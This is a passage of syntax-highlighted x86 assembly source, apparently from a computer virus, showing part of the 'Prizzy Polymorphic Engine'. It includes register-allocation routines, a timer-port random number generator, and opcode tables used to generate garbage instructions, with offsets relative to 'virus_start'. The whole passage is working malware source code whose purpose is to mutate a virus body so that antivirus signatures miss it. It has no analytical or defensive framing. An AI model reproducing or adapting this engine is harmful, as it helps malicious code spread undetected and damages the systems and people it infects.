        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ppe_set_valid_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;input: AL = (base/copro/mmx)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;   AH = reg</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_svr_mmx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;this function disable reg</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_svr_copro</span><span class="sc0">     </span><span class="sc1">;from b/c/m to the next use</span><span class="sc0">

        </span><span class="sc1">; disable b-reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_svr_finish</span><span class="sc0">
    </span><span class="sc5">__ppe_svr_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_copro</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_mmx</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_svr_finish</span><span class="sc0">
    </span><span class="sc5">__ppe_svr_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_mmx</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_copro</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

    </span><span class="sc5">__ppe_svr_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ random numbers ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_rnd32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_last</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_last</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ppe_get_rnd_range</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ polymorphic tables ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">; some equ's needed by Prizzy Polymorphic Engine (PPE)</span><span class="sc0">

</span><span class="sc5">REG_NO_8BIT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;esi,edi,ebp aren't 8bit</span><span class="sc0">
</span><span class="sc5">REG_IS_STACK</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;reg is stack because of mmx, copro</span><span class="sc0">
</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;reg isn't suited for copro</span><span class="sc0">

</span><span class="sc5">REG_FLAGS</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;one byte to set tbl_regs' flags</span><span class="sc0">

</span><span class="sc5">USED_MEMORY</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">          </span><span class="sc1">;we must be far then 30 bytes in poly</span><span class="sc0">

</span><span class="sc5">USED_BASED</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;don't generate copro &amp; mmx</span><span class="sc0">
</span><span class="sc5">USED_FLAGS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;generated garbages can't modify flags</span><span class="sc0">
</span><span class="sc5">USED_COPRO</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;don't generate copro garbage (needed if we're moving copro-reg)</span><span class="sc0">
</span><span class="sc5">USED_MMX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;don't generate  mmx  garbage</span><span class="sc0">

        </span><span class="sc1">; table of registers</span><span class="sc0">
        </span><span class="sc1">; DO NOT modify this table or the next because they're</span><span class="sc0">
        </span><span class="sc1">; dependent on - because of tranfer to reg_bcd</span><span class="sc0">

</span><span class="sc5">tbl_regs</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000001b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;ecx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000010b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;edx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000011b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">;ebx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000100b</span><span class="sc4">,</span><span class="sc5">REG_IS_STACK</span><span class="sc4">+\
</span><span class="sc0">                  </span><span class="sc5">REG_NO_COPRO</span><span class="sc0">  </span><span class="sc1">;esp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000101b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc4">+\
</span><span class="sc0">                  </span><span class="sc5">REG_NO_COPRO</span><span class="sc0">  </span><span class="sc1">;ebp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000110b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">   </span><span class="sc1">;esi</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000111b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">   </span><span class="sc1">;edi</span><span class="sc0">
</span><span class="sc5">end_regs</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table for use registers, DO NOT modify or move</span><span class="sc0">

</span><span class="sc5">tbl_regs_bcd</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000001b</span><span class="sc0">       </span><span class="sc1">;eax, mm0, st(0)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000010b</span><span class="sc0">       </span><span class="sc1">;ecx, mm1, st(1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000100b</span><span class="sc0">       </span><span class="sc1">;edx, mm2, st(2)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00001000b</span><span class="sc0">       </span><span class="sc1">;ebx, mm3, st(3)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00010000b</span><span class="sc0">       </span><span class="sc1">;esp, mm4, st(4)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00100000b</span><span class="sc0">       </span><span class="sc1">;ebp, mm5, st(5)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000000b</span><span class="sc0">       </span><span class="sc1">;esi, mm6, st(4)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10000000b</span><span class="sc0">       </span><span class="sc1">;edi, mm7, st(7)</span><span class="sc0">
</span><span class="sc5">end_regs_bcd</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for math reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc0">            </span><span class="sc1">;add</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C8h</span><span class="sc0">            </span><span class="sc1">;or</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc0">            </span><span class="sc1">;and</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E8h</span><span class="sc0">            </span><span class="sc1">;sub</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F0h</span><span class="sc0">            </span><span class="sc1">;xor</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D0h</span><span class="sc0">            </span><span class="sc1">;adc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D8h</span><span class="sc0">            </span><span class="sc1">;sbb</span><span class="sc0">
</span><span class="sc5">end_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for math reg,reg</span><span class="sc0">

</span><span class="sc5">tbl_math_reg</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;add</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Bh</span><span class="sc0">         </span><span class="sc1">;or</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13h</span><span class="sc0">         </span><span class="sc1">;adc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1Bh</span><span class="sc0">         </span><span class="sc1">;sbb</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">23h</span><span class="sc0">         </span><span class="sc1">;and</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0">         </span><span class="sc1">;sub</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0">         </span><span class="sc1">;xor</span><span class="sc0">
</span><span class="sc5">end_math_reg</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; one byte insctructions that doesn't modify reg</span><span class="sc0">

</span><span class="sc5">tbl_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">end_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for rotate/shift reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_rs_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc0">            </span><span class="sc1">;rol</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C8h</span><span class="sc0">            </span><span class="sc1">;ror</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D0h</span><span class="sc0">            </span><span class="sc1">;rcl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D8h</span><span class="sc0">            </span><span class="sc1">;rcr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc0">            </span><span class="sc1">;shl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E8h</span><span class="sc0">            </span><span class="sc1">;shr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F8h</span><span class="sc0">            </span><span class="sc1">;sar</span><span class="sc0">
</span><span class="sc5">end_rs_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for bit tests reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_bt_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">  </span><span class="sc1">;bt, bts, btr, btc</span><span class="sc0">
</span><span class="sc5">end_bt_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for bit tests reg,reg</span><span class="sc0">

</span><span class="sc5">tbl_bt_reg</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0A3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc0">  </span><span class="sc1">;bt, bts, btr btc</span><span class="sc0">
</span><span class="sc5">end_bt_reg</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for generate defined number</span><span class="sc0">
        </span><span class="sc1">; decode_instruction = encode_instruction + 1st_number</span><span class="sc0">
        </span><span class="sc1">; reg32 = 2nd_number + defined_reg32</span><span class="sc0">
        </span><span class="sc1">; immX  = 3rd_number * 8</span><span class="sc0">

</span><span class="sc5">tbl_num_code</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc1">;add (reg32), imm32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc1">;sub (reg32), imm32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc1">;xor (reg32), imm32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;rol (reg32), imm8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;ror (reg32), imm8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;not (reg32)</span><span class="sc0">
</span><span class="sc5">end_num_code</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of rep/repnz operations</span><span class="sc0">

</span><span class="sc5">tbl_repeat</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_cmps</span><span class="sc0">    </span><span class="sc1">;compare mem operand</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_lods</span><span class="sc0">    </span><span class="sc1">;load mem operand</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_stos</span><span class="sc0">    </span><span class="sc1">;store mem data</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_scas</span><span class="sc0">    </span><span class="sc1">;scan mem</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_movs</span><span class="sc0">    </span><span class="sc1">;move data from mem to mem</span><span class="sc0">
</span><span class="sc5">end_repeat</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of iluzo returns</span><span class="sc0">

</span><span class="sc5">tbl_iluzo_ret</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_2</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_4</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_6</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__iluzo_return_9</span><span class="sc0">
</span><span class="sc5">end_iluzo_ret</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of instructions to save any value to copro-reg</span><span class="sc0">
        </span><span class="sc1">; the first value means if we must modify reg in instruction</span><span class="sc0">

</span><span class="sc5">tbl_copro_movin</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FILD  word ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FILD dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">        </span><span class="sc1">;FILD qword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FLD  dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FLD  qword ptr</span><span class="sc0">
